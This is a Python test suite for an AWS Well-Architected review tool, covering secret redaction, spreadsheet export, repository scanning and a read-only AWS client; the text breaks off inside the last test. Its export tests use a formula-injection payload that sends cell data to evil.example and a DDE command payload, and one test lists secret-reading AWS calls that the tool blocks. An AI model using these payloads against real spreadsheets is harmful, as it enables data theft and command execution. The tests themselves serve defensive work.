#!/usr/bin/env python3
"""Offline tests: no network, no boto3, no real AWS. Run: python3 -m unittest discover -s tests -v"""
import base64
import contextlib
import csv
import datetime
import io
import json
import os
import re
import string
import sys
import tempfile
import unittest
import urllib.parse
from unittest import mock

try:
    import openpyxl  # noqa: F401
    HAVE_OPENPYXL = True
except ImportError:
    HAVE_OPENPYXL = False
# Tests that write an xlsx and read it back need openpyxl; without it they are skipped, not failed
needs_openpyxl = unittest.skipUnless(HAVE_OPENPYXL, "openpyxl is not installed, skipping (pip install openpyxl)")

FAKE_KEY = "AK" + "IA" + "ABCDEFGHIJKLMNOP"   # built at runtime so that scanners do not flag this file
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SCRIPTS = os.path.join(ROOT, "skills", "kensa-review", "scripts")
ASSETS = os.path.join(ROOT, "skills", "kensa-review", "assets")
FIXTURE = os.path.join(ROOT, "tests", "fixtures", "mini_checklist.csv")
sys.path.insert(0, SCRIPTS)

import kensa  # noqa: E402
import kensa_i18n as i18n  # noqa: E402
import kensa_scan  # noqa: E402
import kensa_wa  # noqa: E402


def read_json(path):
    with open(path, encoding="utf-8") as f:
        return json.load(f)


def write_json(obj, path):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f)


def read_text(path, enc="utf-8"):
    with open(path, encoding=enc) as f:
        return f.read()


def run(argv, d, lang=None, env=None):
    """Run kensa.main with --dir d (and --lang when given). KENSA_LANG is cleared unless `env` sets it, so the tests do not depend on the caller's environment."""
    buf, err = io.StringIO(), io.StringIO()
    code = 0
    args = ["--dir", d] + (["--lang", lang] if lang else []) + argv
    with mock.patch.dict(os.environ):
        os.environ.pop(i18n.ENV_VAR, None)
        os.environ.update(env or {})
        with contextlib.redirect_stdout(buf), contextlib.redirect_stderr(err):
            try:
                kensa.main(args)
            except SystemExit as e:
                code = e.code
    return code, buf.getvalue(), err.getvalue()


class Fake(Exception):
    def __init__(self, code, msg="x"):
        super().__init__(msg)
        self.response = {"Error": {"Code": code, "Message": msg}}


class FakeClient:
    def __init__(self, svc, table):
        self.svc, self.table, self.calls = svc, table, []

    def can_paginate(self, op):
        return False

    def __getattr__(self, op):
        def call(**kw):
            self.calls.append((op, kw))
            v = self.table.get((self.svc, op), Fake("NotImplementedInFake", f"{self.svc}.{op}"))
            if isinstance(v, Exception):
                raise v
            return v(**kw) if callable(v) else v
        return call


class FakeSession:
    def __init__(self, table):
        self.table = table

    def client(self, svc, region_name=None):
        return FakeClient(svc, self.table)


class DataIntegrity(unittest.TestCase):
    def setUp(self):
        self.routing = read_json(os.path.join(ASSETS, "routing.json"))
        self.cards = read_json(os.path.join(ASSETS, "cards.json"))

    def test_interview_choices_have_cards_and_cards_exist(self):
        ids = {c["id"] for c in self.cards["cards"]}
        for cid, r in self.routing["choices"].items():
            self.assertEqual("interview" in r["ch"], bool(r["card"]), cid)
            if r["card"]:
                self.assertIn(r["card"], ids, cid)

    def test_every_card_is_used_and_complete(self):
        used = {r["card"] for r in self.routing["choices"].values() if r["card"]}
        for c in self.cards["cards"]:
            self.assertIn(c["id"], used)
            for k in ("title", "why", "ask", "ladder", "recommend", "alternatives", "org_shape"):
                self.assertTrue(c[k], (c["id"], k))
            for k in ("full", "partial", "none"):
                self.assertTrue(c["ladder"][k])
            self.assertTrue(c["recommend"]["steps"])
            self.assertIn(c["recommend"]["effort"], ("S", "M", "L"))
            self.assertIn(c["recommend"]["priority"], ("P1", "P2", "P3"))

    def test_business_cards(self):
        for b in self.cards["business"]:
            keys = {o["key"] for o in b["options"]}
            self.assertIn(b["recommend"], keys)

    def test_unknown_choice_falls_back_to_question_default(self):
        items = [kensa.new_item({"choice_id": "sec_new_in_2027", "question_id": "protect-data-rest", "pillar": "Security"}),
                 kensa.new_item({"choice_id": "zzz", "question_id": "brand-new-question", "pillar": "Security"})]
        unknown = kensa.apply_routing(items, self.routing)
        self.assertEqual(items[0]["route"]["ch"], ["aws"])
        self.assertEqual(items[0]["route"]["known"], "question")
        self.assertEqual(items[1]["route"]["ch"], ["interview"])
        self.assertEqual(unknown, ["zzz"])


class Flow(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.d = os.path.join(self.tmp.name, ".kensa")
        run(["init"], self.d)
        code, out, _ = run(["seed", "--from-csv", FIXTURE], self.d)
        self.assertEqual(code, 0, out)

    def tearDown(self):
        self.tmp.cleanup()

    def work(self):
        return read_json(os.path.join(self.d, "worklist.json"))

    def item(self, cid):
        return next(i for i in self.work()["items"] if i["choice_id"] == cid)

    def test_seed_routes(self):
        w = self.work()
        self.assertEqual(len(w["items"]), 12)
        self.assertEqual(self.item("sec_protect_data_rest_encrypt")["route"]["ch"], ["aws"])
        self.assertEqual(self.item("rel_planning_for_recovery_objective_defined_recovery")["route"]["card"], "C-REL-RTO-RPO")

    def test_apply_redacts_and_respects_precedence(self):
        f = os.path.join(self.tmp.name, "a.json")
        write_json([{"choice_id": "sec_protect_data_rest_encrypt", "verdict": "○", "channel": "aws", "confidence": "H",
                    "evidence": f"rds StorageEncrypted=true; key {FAKE_KEY} leaked password=hunter2"}], f)
        code, out, _ = run(["apply", f], self.d)
        self.assertEqual(code, 0)
        it = self.item("sec_protect_data_rest_encrypt")
        self.assertNotIn("AKIA", it["evidence"])
        self.assertNotIn("hunter2", it["evidence"])
        # weaker evidence must not overwrite stronger evidence
        write_json([{"choice_id": "sec_protect_data_rest_encrypt", "verdict": "✗", "channel": "interview", "confidence": "M"}], f)
        run(["apply", f], self.d)
        self.assertEqual(self.item("sec_protect_data_rest_encrypt")["verdict"], "○")
        run(["apply", f, "--force"], self.d)
        self.assertEqual(self.item("sec_protect_data_rest_encrypt")["verdict"], "✗")

    def test_redact_covers_json_style_secrets(self):
        # Pasting an API response as evidence gives JSON in which both key and value are quoted
        cases = {
            '{"password": "hunter2"}': "hunter2",
            '{"token": "abc123", "ok": true}': "abc123",
            '"SecretAccessKey": "wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY"': "wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY",
            '"SessionToken": "IQoJb3JpZ2luX2VjEXAMPLE"': "IQoJb3JpZ2luX2VjEXAMPLE",
            "{'client_secret': 'sh0rt'}": "sh0rt",
            '{"password": "has \\"quote\\" and space"}': "space",
            "password=hunter2": "hunter2",
            "api_key: s3cr3t": "s3cr3t",
        }
        for text, secret in cases.items():
            out = kensa.redact(text)
            self.assertNotIn(secret, out, (text, out))
            self.assertIn("[REDACTED]", out, (text, out))
        # A sentence that is not a secret is left unchanged
        for ok in ("password policy: enabled", "MaxPasswordAge: 90", "token_count: 5", "rds StorageEncrypted=true"):
            self.assertEqual(kensa.redact(ok), ok)

    def test_bad_verdict_rejected(self):
        f = os.path.join(self.tmp.name, "a.json")
        write_json([{"choice_id": "sec_protect_data_rest_encrypt", "verdict": "maybe"}], f)
        code, _, err = run(["apply", f], self.d)
        self.assertNotEqual(code, 0)
        self.assertIn("verdict", err)

    def test_cards_can_be_limited_to_pillars(self):
        # F2: a time-boxed session covers only some pillars; `cards next --pillar` asks only their cards
        run(["plan", "--skip", "repo,aws"], self.d)
        _, all_out, _ = run(["cards", "next", "-n", "99"], self.d)
        _, ops, _ = run(["cards", "next", "-n", "99", "--pillar", "operationalExcellence"], self.d)
        self.assertIn("C-OPS-OWNERSHIP", ops)
        self.assertLess(ops.count("###"), all_out.count("###"))
        _, by_name, _ = run(["cards", "next", "-n", "99", "--pillar", "Operational Excellence"], self.d)
        self.assertEqual(by_name, ops)
        _, listed, _ = run(["cards", "list", "--pillar", "operationalExcellence"], self.d)
        self.assertIn("C-OPS-OWNERSHIP", listed)
        _, none, _ = run(["cards", "next", "--pillar", "nosuchpillar"], self.d)
        self.assertIn("No ready card covers pillar(s) nosuchpillar", none)

    def test_card_flow_fills_all_covered_items_and_keeps_evidence(self):
        run(["context", "set", "tools.chat=Slack", "team.po=PO"], self.d)
        run(["plan", "--skip", "repo,aws"], self.d)   # these items now have evidence routes: cards open once each is tried/skipped
        code, out, _ = run(["cards", "next", "-n", "20"], self.d)
        self.assertIn("C-OPS-OWNERSHIP", out)
        self.assertNotIn("C-SEC-APPSEC", out.split("###")[0])
        code, out, _ = run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "none"], self.d)
        self.assertEqual(code, 0, out)
        for cid in ("ops_ops_model_def_proc_owners", "ops_ops_model_def_activity_owners"):
            it = self.item(cid)
            self.assertEqual((it["verdict"], it["channel"], it["confidence"]), ("✗", "interview", "M"))
            self.assertIn("Slack", it["org_shape"])
            self.assertTrue(it["recommendation"])
            self.assertEqual(it["priority"], "P2")
        # card answered -> no longer pending
        _, out, _ = run(["cards", "list", "--pending"], self.d)
        self.assertNotIn("C-OPS-OWNERSHIP", out)

    def test_card_na_only_when_allowed(self):
        code, _, err = run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "na"], self.d)
        self.assertNotEqual(code, 0)
        code, out, _ = run(["cards", "answer", "C-SUS-GOALS", "--current", "na", "--note", "backend only, so not applicable"], self.d)
        self.assertEqual(code, 0, out)
        it = self.item("sus_sus_hardware_a5")
        self.assertEqual(it["verdict"], "N/A")
        self.assertTrue(it["na_reason"])

    def test_cards_wait_for_scans_when_aws_first(self):
        # the RTO/RPO item has AWS + repo evidence routes: it joins its card only once both are tried or skipped
        def pending(card):
            st = kensa.Store(self.d)
            return dict((c["id"], ids) for c, ids in kensa.pending_cards(st.work(), kensa.load_cards(st))).get(card, [])
        obj = "rel_planning_for_recovery_objective_defined_recovery"
        self.assertEqual(pending("C-REL-RTO-RPO"), [])
        self.assertEqual(pending("C-DEV-PROCESS"), [])      # appsec manual review is R+I: waits for the repo scan
        run(["plan", "--skip", "repo"], self.d)
        self.assertTrue(pending("C-DEV-PROCESS"))
        self.assertNotIn(obj, pending("C-REL-RTO-RPO"))     # aws not yet tried
        run(["plan", "--skip", "aws"], self.d)
        self.assertIn(obj, pending("C-REL-RTO-RPO"))

    def test_evidence_beats_self_report_in_card(self):
        f = os.path.join(self.tmp.name, "a.json")
        write_json([{"choice_id": "rel_planning_for_recovery_dr_tested", "verdict": "○", "channel": "aws", "confidence": "H",
                    "evidence": "restore jobs completed=3"}], f)
        run(["apply", f], self.d)
        run(["plan", "--skip", "repo,aws"], self.d)
        run(["cards", "answer", "C-REL-RTO-RPO", "--current", "none"], self.d)
        self.assertEqual(self.item("rel_planning_for_recovery_dr_tested")["verdict"], "○")
        self.assertEqual(self.item("rel_planning_for_recovery_objective_defined_recovery")["verdict"], "✗")

    def test_finalize_assumes_unresolved(self):
        run(["finalize", "--allow-empty"], self.d)
        for i in self.work()["items"]:
            self.assertIsNotNone(i["verdict"])
        it = self.item("sec_identities_enforce_mechanisms")
        self.assertEqual((it["verdict"], it["channel"], it["confidence"]), ("✗", "assumed", "L"))
        self.assertIn("Needs confirmation", it["recommendation"])

    @needs_openpyxl
    def test_export_xlsx_and_csv(self):
        run(["cards", "answer", "C-OPS-OWNERSHIP", "--current", "partial"], self.d)
        run(["finalize", "--allow-empty"], self.d)
        from openpyxl import load_workbook
        for lang in ("en", "ja"):
            t = i18n.labels(lang)
            x = os.path.join(self.tmp.name, f"out-{lang}.xlsx")
            code, out, _ = run(["export", "--out", x], self.d, lang=lang)
            self.assertEqual(code, 0, out)
            wb = load_workbook(x)
            self.assertEqual(wb.sheetnames, ["Summary", "Checklist", "Questions", "OpenItems", "ActionPlan", "Context"])   # sheet names stay English
            ws = wb["Checklist"]
            self.assertEqual([c.value for c in ws[1]], t["cols"])
            self.assertEqual(ws.max_row, 13)
            self.assertTrue(any(str(c.value).startswith("=COUNTIFS") for r in wb["Summary"].iter_rows() for c in r))
            qs = {r[0].value: r[1].value for r in wb["Questions"].iter_rows(min_row=2)}
            self.assertEqual(qs.get("C-OPS-OWNERSHIP"), t["q_answered"])
            self.assertIn(t["q_unanswered"], qs.values())
            self.assertGreater(wb["OpenItems"].max_row, 1)
            c = os.path.join(self.tmp.name, f"out-{lang}.csv")
            run(["export", "--format", "csv", "--out", c], self.d, lang=lang)
            rows = list(csv.reader(io.StringIO(read_text(c, "utf-8-sig"))))
            self.assertEqual(len(rows), 13)
            self.assertEqual(rows[0], t["cols"])

    def test_mask_account_ids(self):
        f = os.path.join(self.tmp.name, "a.json")
        write_json([{"choice_id": "sec_protect_data_rest_encrypt", "verdict": "○", "channel": "aws", "confidence": "H",
                    "evidence": "account 123456789012 ok"}], f)
        run(["apply", f], self.d)
        c = os.path.join(self.tmp.name, "m.csv")
        run(["finalize", "--allow-empty"], self.d)
        run(["export", "--format", "csv", "--mask-account-ids", "--out", c], self.d)
        self.assertNotIn("123456789012", read_text(c, "utf-8-sig"))

    def apply_evidence(self, text):
        f = os.path.join(self.tmp.name, "inj.json")
        write_json([{"choice_id": "sec_protect_data_rest_encrypt", "verdict": "○", "channel": "aws", "confidence": "H", "evidence": text}], f)
        code, out, _ = run(["apply", f], self.d)
        self.assertEqual(code, 0, out)
        run(["finalize", "--allow-empty"], self.d)

    def test_csv_export_neutralizes_formula_like_text(self):
        # Evidence can contain external content (tags, descriptions, file contents). It must not be evaluated as a formula in a spreadsheet
        payload = '=HYPERLINK("http://evil.example/?x="&A1,"click")'
        self.apply_evidence(payload)
        c = os.path.join(self.tmp.name, "inj.csv")
        code, _, err = run(["export", "--format", "csv", "--out", c], self.d)
        self.assertEqual(code, 0)
        self.assertIn("--mask-account-ids", err)   # the warning shown when exporting without masking
        rows = list(csv.reader(io.StringIO(read_text(c, "utf-8-sig"))))
        cells = [x for r in rows[1:] for x in r]
        self.assertIn("'" + payload, cells)
        self.assertFalse([x for x in cells if x and x[0] in "=+@\t\r"], "cells that could start a formula remain")
        for ok in ("-", "10", "-5"):   # numbers and a lone - are left unchanged
            self.assertEqual(kensa.csv_safe(ok), ok)
        for bad in ("+1+1", "@SUM(1)", "-cmd|' /C calc'!A0", "\t=1"):
            self.assertEqual(kensa.csv_safe(bad), "'" + bad)
        self.assertEqual(kensa.csv_unsafe_strip("'=x"), "=x")
        self.assertEqual(kensa.csv_unsafe_strip("'plain"), "'plain")

    @needs_openpyxl
    def test_xlsx_export_writes_formula_like_text_as_text_but_keeps_summary_formulas(self):
        from openpyxl import load_workbook
        payload = "=1+1"
        self.apply_evidence(payload)
        x = os.path.join(self.tmp.name, "inj.xlsx")
        for flags in ([], ["--mask-account-ids"]):
            code, _, _ = run(["export", "--out", x] + flags, self.d)
            self.assertEqual(code, 0)
            wb = load_workbook(x)
            hits = [c for name in wb.sheetnames if name != "Summary" for r in wb[name].iter_rows() for c in r if c.value == payload]
            self.assertTrue(hits, "the evidence cell was not found")
            self.assertTrue(all(c.data_type == "s" for c in hits), [c.data_type for c in hits])
            self.assertTrue(any(c.data_type == "f" for r in wb["Summary"].iter_rows() for c in r))   # the summary formulas remain

    def test_state_dir_gets_a_gitignore_whichever_command_creates_it(self):
        d = os.path.join(self.tmp.name, "fresh", ".kensa")   # created by another command before init
        code, _, _ = run(["context", "set", "service.name=x"], d)
        self.assertEqual(code, 0)
        self.assertEqual(read_text(os.path.join(d, ".gitignore")).splitlines()[-1], "*")
        code, _, _ = run(["scan-iac", "--path", self.tmp.name], d)   # still in place whether the command fails or succeeds
        self.assertTrue(os.path.exists(os.path.join(d, ".gitignore")))
        d2 = os.path.join(self.tmp.name, "never-created", ".kensa")   # a command that creates nothing does not create the directory either
        run(["iam-policy", "--kind", "scan-deny"], d2)
        self.assertFalse(os.path.exists(d2))

    def test_seed_merge_flags_new_and_removed(self):
        run(["finalize", "--allow-empty"], self.d)
        rows = list(csv.DictReader(io.StringIO(read_text(FIXTURE))))
        rows = rows[1:] + [{"Pillar": "Security", "QuestionId": "protect-data-rest", "QuestionTitle": "q", "ChoiceId": "sec_protect_data_rest_brand_new",
                           "BestPractice": "New BP", "Description": "d", "AWSCheckable": ""}]
        p = os.path.join(self.tmp.name, "v2.csv")
        with open(p, "w", encoding="utf-8", newline="") as f:
            w = csv.DictWriter(f, fieldnames=rows[0].keys())
            w.writeheader()
            w.writerows(rows)
        code, out, _ = run(["seed", "--from-csv", p], self.d)
        self.assertIn("new=1 removed=1", out)
        self.assertEqual(self.item("sec_protect_data_rest_brand_new")["status"], "new_in_lens")
        self.assertTrue(self.item("sec_protect_data_rest_encrypt")["removed"])
        self.assertEqual(self.item("sec_identities_enforce_mechanisms")["verdict"], "✗")  # prior state kept
        _, out, _ = run(["status"], self.d)
        self.assertNotIn("removed", out)

    def test_push_requires_resolution_and_dry_runs(self):
        code, _, err = run(["push", "--workload-id", "w-1"], self.d)
        self.assertNotEqual(code, 0)
        run(["finalize", "--allow-empty"], self.d)
        code, out, _ = run(["push", "--workload-id", "w-1"], self.d)
        self.assertEqual(code, 0)
        self.assertIn("DRY-RUN", out)

    def test_prefill_proposes_without_deciding(self):
        run(["context", "set", "tools.chat=Slack"], self.d)
        code, out, _ = run(["cards", "prefill"], self.d)
        self.assertEqual(code, 0, out)
        it = self.item("ops_ops_model_def_proc_owners")
        self.assertIsNone(it["verdict"])
        self.assertTrue(it["org_shape"].startswith("[Proposal] "))
        self.assertIn("Slack", it["org_shape"])
        self.assertTrue(it["prefilled"])
        # a real answer replaces the proposal; finalize never keeps a prefilled item as resolved
        run(["finalize", "--allow-empty"], self.d)
        self.assertEqual(self.item("ops_ops_model_def_proc_owners")["channel"], "assumed")

    def test_gitignore_created(self):
        self.assertTrue(os.path.exists(os.path.join(self.d, ".gitignore")))


class RepoScan(unittest.TestCase):
    def test_signals(self):
        with tempfile.TemporaryDirectory() as t:
            def w(rel, txt=""):
                p = os.path.join(t, rel)
                os.makedirs(os.path.dirname(p), exist_ok=True)
                with open(p, "w", encoding="utf-8") as fh:
                    fh.write(txt)
            w("cdk.json", "{}")
            w(".github/workflows/ci.yml", "on: [pull_request]\npermissions:\n  id-token: write\njobs:\n  t:\n    steps:\n"
                                         "      - uses: actions/checkout@v4\n      - uses: aws-actions/configure-aws-credentials@v4\n        with:\n          role-to-assume: x\n"
                                         "      - run: pytest\n      - run: ruff check .\n      - uses: github/codeql-action/analyze@v3\n      - run: cdk diff\n")
            w(".github/CODEOWNERS", "* @a")
            w(".github/dependabot.yml", "version: 2")
            w("tests/test_a.py", "def test_x(): pass")
            w("Dockerfile", "FROM python:3.12-slim\nUSER app\nHEALTHCHECK CMD true\n")
            w("docs/runbooks/deploy.md", "# deploy")
            w("docs/adr/0001-x.md", "# adr")
            w("src/config.py", f'KEY = "{FAKE_KEY}"\n')
            r = kensa_scan.scan_repo(t)["signals"]
            self.assertEqual(r["iac"]["tools"], ["cdk"])
            self.assertTrue(r["ci"]["oidc_to_aws"])
            self.assertFalse(r["ci"]["static_aws_keys_in_actions"])
            self.assertTrue(r["ci"]["tests"] and r["ci"]["lint"] and r["ci"]["sast"] and r["ci"]["preview_diff"])
            self.assertTrue(r["review"]["codeowners"] and r["deps"]["dependabot"])
            self.assertEqual(r["container"]["non_root_user"], 1)
            self.assertTrue(r["docs"]["runbooks"] and r["docs"]["adr"])
            self.assertEqual(r["hardcoded_secrets"]["count"], 1)
            self.assertNotIn("AKIA", json.dumps(r))   # never echo the key itself

    def test_github_scan_uses_get_only_and_summarizes(self):
        calls = []

        class P:
            def __init__(self, out, rc=0, err=""):
                self.stdout, self.returncode, self.stderr = out, rc, err

        def runner(cmd, **kw):
            calls.append(cmd)
            ep = cmd[2]
            if ep.endswith("/protection"):
                return P(json.dumps({"required_pull_request_reviews": {"required_approving_review_count": 1},
                                     "required_status_checks": {"contexts": ["ci"]}, "allow_force_pushes": {"enabled": False},
                                     "enforce_admins": {"enabled": True}}))
            if ep.endswith("/rulesets"):
                return P("[]")
            if ep.endswith("/vulnerability-alerts"):
                return P("")
            return P(json.dumps({"default_branch": "main", "visibility": "private",
                                 "security_and_analysis": {"secret_scanning": {"status": "enabled"}}}))
        g = kensa_scan.scan_github("o/r", runner)
        self.assertEqual(g["branch_protection"]["required_approvals"], 1)
        self.assertTrue(g["dependabot_alerts_enabled"])
        self.assertEqual(g["secret_scanning"], "enabled")
        for c in calls:
            self.assertEqual(c[:2], ["gh", "api"])
            self.assertNotIn("-X", c)
            self.assertNotIn("--method", c)


class AwsScan(unittest.TestCase):
    def test_readonly_proxy_blocks_writes_and_secret_reads(self):
        ro = kensa_scan.ReadOnlyClient(FakeClient("s3", {("s3", "list_buckets"): {"Buckets": []}}), "s3")
        self.assertEqual(ro.list_buckets(), {"Buckets": []})
        for bad in ("put_object", "delete_bucket", "create_user", "update_answer", "get_secret_value", "get_parameter",
                    "get_object", "get_function", "get_authorization_token", "describe_instance_attribute", "get_session_token"):
            with self.assertRaises(PermissionError, msg=bad):
                getattr(ro, bad)()

    def test_scan_isolates_failures(self):
        t = {
            ("sts", "get_caller_identity"): {"Account": "123456789012", "Arn": "arn:aws:sts::123456789012:assumed-role/Admin/x"},
            ("iam", "get_account_summary"): {"SummaryMap": {"AccountMFAEnabled": 0, "AccountAccessKeysPresent": 1, "Users": 2, "Roles": 9, "Groups": 0}},
            ("iam", "get_account_password_policy"): Fake("NoSuchEntity"),
            ("organizations", "describe_organization"): Fake("AWSOrganizationsNotInUseException"),
            ("cloudtrail", "describe_trails"): {"trailList": [{"TrailARN": "arn:x", "IsMultiRegionTrail": True, "LogFileValidationEnabled": True, "KmsKeyId": "k"}]},
            ("cloudtrail", "get_trail_status"): {"IsLogging": True},
            ("guardduty", "list_detectors"): Fake("AccessDeniedException", "not authorized"),
            ("securityhub", "describe_hub"): Fake("InvalidAccessException", "not subscribed"),
            ("s3", "list_buckets"): {"Buckets": [{"Name": "b1"}, {"Name": "b2"}]},
            ("s3", "get_public_access_block"): {"PublicAccessBlockConfiguration": {"BlockPublicAcls": True, "IgnorePublicAcls": True, "BlockPublicPolicy": True, "RestrictPublicBuckets": True}},
            ("s3", "get_bucket_encryption"): {"ServerSideEncryptionConfiguration": {"Rules": [{"ApplyServerSideEncryptionByDefault": {"SSEAlgorithm": "AES256"}}]}},
            ("s3", "get_bucket_versioning"): {"Status": "Enabled"},
            ("s3", "get_bucket_lifecycle_configuration"): Fake("NoSuchLifecycleConfiguration"),
            ("s3", "get_bucket_policy_status"): Fake("NoSuchBucketPolicy"),
            ("ec2", "describe_security_groups"): {"SecurityGroups": [{"GroupId": "sg-1", "IpPermissions": [{"IpProtocol": "tcp", "FromPort": 22, "ToPort": 22, "IpRanges": [{"CidrIp": "0.0.0.0/0"}], "Ipv6Ranges": []}]}]},
            ("ec2", "describe_subnets"): {"Subnets": [{"AvailabilityZone": "ap-northeast-1a"}, {"AvailabilityZone": "ap-northeast-1c"}]},
            ("ec2", "describe_vpcs"): {"Vpcs": [{}]}, ("ec2", "describe_flow_logs"): {"FlowLogs": []},
            ("ec2", "describe_vpc_endpoints"): {"VpcEndpoints": []}, ("ec2", "describe_nat_gateways"): {"NatGateways": [{"State": "available"}]},
            ("rds", "describe_db_instances"): {"DBInstances": [{"Engine": "postgres", "StorageEncrypted": False, "MultiAZ": False, "PubliclyAccessible": False,
                                                                "BackupRetentionPeriod": 7, "DeletionProtection": False, "DBInstanceClass": "db.t3.medium"}]},
            ("rds", "describe_db_clusters"): {"DBClusters": []},
            ("dynamodb", "list_tables"): {"TableNames": []},
        }
        res = kensa_scan.run_aws_scan(FakeSession(t), ["ap-northeast-1"])
        c = res["checks"]
        self.assertEqual(res["account"], "123456789012")
        self.assertEqual(c["identity"]["data"]["principal_type"], "assumed-role")
        self.assertEqual(c["organizations"]["data"], {"in_org": False})
        self.assertFalse(c["iam_account"]["data"]["root_mfa_enabled"])
        self.assertTrue(c["iam_account"]["data"]["root_access_keys_present"])
        self.assertIsNone(c["iam_account"]["data"]["password_policy"])
        r = c["cloudtrail"]["regions"]["ap-northeast-1"]
        self.assertEqual((r["status"], r["data"]["trails"][0]["multi_region"]), ("ok", True))
        self.assertEqual(c["guardduty"]["status"], "denied")
        self.assertEqual(c["securityhub"]["status"], "not_enabled")
        s3 = c["s3"]["data"]
        self.assertEqual((s3["total"], s3["public_access_block_all"], s3["sse_s3_only"], s3["versioning_on"], s3["lifecycle"]), (2, 2, 2, 2, 0))
        v = c["vpc"]["regions"]["ap-northeast-1"]["data"]
        self.assertEqual(v["sg_risky_ports_open_to_world"], ["sg-1"])
        self.assertEqual(v["subnet_azs"], 2)
        d = c["databases"]["regions"]["ap-northeast-1"]["data"]
        self.assertEqual((d["storage_unencrypted"], d["backup_retention_min_days"]), (1, 7))
        # checks that have no canned responses are recorded as errors, never raised
        self.assertIn(c["kms"]["status"], ("error", "denied", "not_enabled"))

    def test_iam_users_does_not_turn_a_denied_call_into_zero_console_users(self):
        base = {("sts", "get_caller_identity"): {"Account": "123456789012", "Arn": "arn:aws:sts::123456789012:assumed-role/Ro/x"},
                ("iam", "list_users"): {"Users": [{"UserName": "u1"}]},
                ("iam", "list_access_keys"): {"AccessKeyMetadata": []},
                ("iam", "list_mfa_devices"): {"MFADevices": []}}

        def scan(login):
            t = {**base, ("iam", "get_login_profile"): login}
            return kensa_scan.run_aws_scan(FakeSession(t), ["ap-northeast-1"], only={"iam_users"})["checks"]["iam_users"]
        # Missing permission is not 'no console use'. Record it as denied, which is not grounds for a verdict
        self.assertEqual(scan(Fake("AccessDenied", "not authorized"))["status"], "denied")
        # Only when there is no login profile (= no console use) is the user left out of the MFA check
        none = scan(Fake("NoSuchEntity", "Login Profile for User u1 cannot be found"))
        self.assertEqual((none["status"], none["data"]["console_users_without_mfa"]), ("ok", 0))
        has = scan({"LoginProfile": {"UserName": "u1"}})
        self.assertEqual((has["status"], has["data"]["console_users_without_mfa"]), ("ok", 1))

    def test_securityhub_standard_names_come_from_the_arn_not_the_version(self):
        # A bug found by scanning a real account: cutting from the end turned the name into 'v'
        for arn, name in [
            ("arn:aws:securityhub:ap-northeast-1::standards/aws-foundational-security-best-practices/v/1.0.0", "aws-foundational-security-best-practices"),
            ("arn:aws:securityhub:ap-northeast-1::standards/cis-aws-foundations-benchmark/v/1.4.0", "cis-aws-foundations-benchmark"),
            ("arn:aws:securityhub:::ruleset/cis-aws-foundations-benchmark/v/1.2.0", "cis-aws-foundations-benchmark"),
            ("arn:aws:securityhub:ap-northeast-1::standards/nist-800-53/v/5.0.0", "nist-800-53"),
            ("", ""),
        ]:
            self.assertEqual(kensa_scan._standard_name(arn), name, arn)
        t = {("securityhub", "describe_hub"): {"HubArn": "arn:x"},
             ("securityhub", "get_enabled_standards"): {"StandardsSubscriptions": [
                 {"StandardsArn": "arn:aws:securityhub:ap-northeast-1::standards/aws-foundational-security-best-practices/v/1.0.0"},
                 {"StandardsArn": "arn:aws:securityhub:ap-northeast-1::standards/cis-aws-foundations-benchmark/v/1.4.0"}]}}
        res = kensa_scan.run_aws_scan(FakeSession(t), ["ap-northeast-1"], only={"securityhub"})
        self.assertEqual(res["checks"]["securityhub"]["regions"]["ap-northeast-1"]["data"]["standards"],
                         ["aws-foundational-security-best-practices", "cis-aws-foundations-benchmark"])

    def test_a_service_that_is_not_enabled_is_not_reported_as_a_permission_problem(self):
        # Macie returns AccessDeniedException ("Macie is not enabled") when it is not enabled. Do not mix that up with a permission problem
        self.assertEqual(kensa_scan.classify_error(Fake("AccessDeniedException", "Macie is not enabled"))[0], "not_enabled")
        self.assertEqual(kensa_scan.classify_error(Fake("AccessDeniedException", "Account is not enrolled in Amazon Inspector"))[0], "not_enabled")
        # A real permission problem (implicit or explicit Deny, SCP) stays denied
        for msg in ("User: arn:aws:sts::1:assumed-role/R/s is not authorized to perform: macie2:GetMacieSession on resource: * ",
                    "User: arn:x is not authorized to perform: ssm:GetParameter on resource: arn:y with an explicit deny in an identity-based policy",
                    "... with an explicit deny in a service control policy"):
            self.assertEqual(kensa_scan.classify_error(Fake("AccessDeniedException", msg))[0], "denied", msg)
        self.assertEqual(kensa_scan.classify_error(Fake("UnauthorizedOperation", "You are not authorized to perform this operation."))[0], "denied")

    def test_all_registered_checks_use_only_read_operations(self):
        import inspect
        import re
        src = inspect.getsource(kensa_scan)
        ops = set(re.findall(r"\.((?:list|describe|get|batch_get)_[a-z_0-9]+)\(", src))   # calls (no exceptions)
        # References as strings. The keys of DENY_ACTIONS are data that maps the forbidden APIs to the Deny policy, not calls
        ops |= set(re.findall(r'"((?:list|describe|get|batch_get)_[a-z_0-9]+)"', src)) - set(kensa_scan.DENY_ACTIONS)
        ops -= {"get_paginator", "get_waiter"}
        blocked = [o for o in ops if not kensa_scan.ReadOnlyClient.allowed(o)]
        self.assertEqual(blocked, [], f"scan code references blocked operations: {blocked}")


class WaTool(unittest.TestCase):
    def items(self):
        mk = lambda cid, q, v, **k: dict({"choice_id": cid, "question_id": q, "pillar": "Security", "verdict": v, "channel": "aws", "confidence": "H", "evidence": "e"}, **k)
        return [mk("a", "q1", "○"), mk("b", "q1", "△"), mk("c", "q1", "N/A", na_reason_code="BUSINESS_PRIORITIES"),
                mk("d", "q2", "✗"), mk("e", "q3", "N/A"), mk("f", "q3", "N/A")]

    def test_plan_updates(self):
        p = {x["QuestionId"]: x for x in kensa_wa.plan_updates(self.items(), {"q2": "q2_none"})}
        u = p["q1"]["ChoiceUpdates"]
        self.assertEqual([u[k]["Status"] for k in "abc"], ["SELECTED", "UNSELECTED", "NOT_APPLICABLE"])
        self.assertEqual(u["c"]["Reason"], "BUSINESS_PRIORITIES")
        self.assertTrue(all(len(v["Notes"]) <= 250 for v in u.values()))
        self.assertEqual(p["q2"]["ChoiceUpdates"]["q2_none"]["Status"], "SELECTED")   # nothing selected -> "None of these"
        self.assertFalse(p["q3"]["IsApplicable"])
        self.assertNotIn("ChoiceUpdates", p["q3"])

    def test_push_dry_run_and_apply(self):
        res = kensa_wa.push("w", self.items())
